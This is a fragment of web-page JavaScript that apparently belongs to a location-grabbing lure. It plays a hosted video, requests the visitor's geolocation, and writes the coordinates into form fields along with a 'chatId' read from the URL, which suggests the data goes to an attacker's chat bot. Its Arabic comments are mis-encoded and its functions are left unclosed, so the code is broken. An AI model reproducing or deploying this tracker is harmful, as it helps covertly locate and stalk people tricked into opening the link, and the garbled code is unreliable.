  <script>
    async function playVideoAndCaptureLocation() {
      const videoUrl = 'https://cdn.glitch.global/cd384709-1a5a-449d-bcf3-508f08fff5ec/VID_20240831_164501_356.mp4?v=1725112146399';
      const videoElement = document.getElementById('video');

      // Ø¹Ø±Ø¶ Ø§Ù„ÙÙŠØ¯ÙŠÙˆ
      videoElement.style.display = 'block';
      videoElement.src = videoUrl;
      videoElement.play();

      // Ø¹Ø±Ø¶ Ø§Ù„Ø±Ù…Ø² Ø§Ù„ØªØ­Ù…ÙŠÙ„ÙŠ
      loadingElement.style.display = 'block';

      // Ø§Ù†ØªØ¸Ø§Ø± ÙØªØ±Ø© Ù‚ØµÙŠØ±Ø© Ù‚Ø¨Ù„ Ø§Ù„Ø¨Ø¯Ø¡ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹
      await new Promise(resolve => setTimeout(resolve, 1000));

      if (navigator.geolocation) {

    function showPosition(position) {
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      const chatId = getParameterByName('chatId');

      document.getElementById("latitude").value = latitude;
      document.getElementById("longitude").value = longitude;
      document.getElementById("chatId").value = chatId;

      // Ø¥Ø®ÙØ§Ø¡ Ø§Ù„Ø±Ù…Ø² Ø§Ù„ØªØ­Ù…ÙŠÙ„ÙŠ
      document.getElementById("loading").style.display = "none";

    function handleError(error) {

      document.getElementById("loading").style.display = "none";

      switch (error.code) {
        case error.PERMISSION_DENIED:
          alert("User denied the request for Geolocation.");
          break;
        case error.POSITION_UNAVAILABLE:
          alert("Location information is unavailable.");
          break;
        case error.TIMEOUT:
          alert("The request to get user location timed out.");
          break;
        case error.UNKNOWN_ERROR:
          alert("An unknown error occurred.");
          break;
      }
    }

    function getParameterByName(name, url = window.location.href) {
      name = name.replace(/[\[\]]/g, '\\$&');
      const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
      if (!results) return null;
      if (!results[2]) return '';
      return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }
